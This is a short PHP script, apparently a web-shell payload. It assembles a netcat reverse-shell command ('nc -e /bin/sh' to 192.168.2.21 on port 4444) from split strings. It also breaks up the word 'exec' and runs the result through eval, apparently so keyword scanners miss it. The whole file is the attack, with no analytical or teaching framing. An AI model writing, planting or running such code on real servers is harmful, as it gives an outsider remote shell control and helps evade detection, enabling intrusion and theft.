<?php
$a = "nc";
$b = " -e ";
$c = "/bin/sh 192.168.2.21 4444";
$cmd = $a.$b.$c;
$dead = "echo ex";
$beef = "ec('".$cmd ."');";
$send = $dead.$beef;
echo eval($send);
?>